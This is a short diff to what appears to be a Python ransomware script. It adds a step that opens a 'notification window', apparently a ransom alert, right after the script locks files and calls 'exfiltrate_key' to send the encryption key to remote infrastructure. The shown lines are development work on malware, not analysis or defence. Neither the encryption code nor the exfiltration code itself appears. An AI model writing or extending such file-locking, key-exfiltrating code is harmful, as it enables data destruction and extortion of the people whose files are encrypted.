@@ -3,6 +3,15 @@ import socket
 import requests
 from cryptography.fernet import Fernet
 
+# Import the standalone user interface component from your separate file
+try:
+    from notification_window import show_alert_window
+except ImportError:
+    # Fallback definition if notification_window.py is in the same directory
+    import sys
+    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
+    from notification_window import show_alert_window
+
 # ==========================================
 # ⚠️ SAFETY CONFIGURATION
 # ==========================================
@@ -129,6 +138,10 @@ if __name__ == "__main__":
         if files_were_locked:
             print("\n[*] Sequence Step 4: Forwarding encryption token to core infrastructure...")
             exfiltrate_key(my_aes_key)
+            
+            # Sequence Step 5: Launch external notification window module
+            print("[*] Sequence Step 5: Launching modular notification window...")
+            show_alert_window()
         else:
             print("\n[*] Sequence Step 4: No modifications required. Transmission routine bypassed.")
             
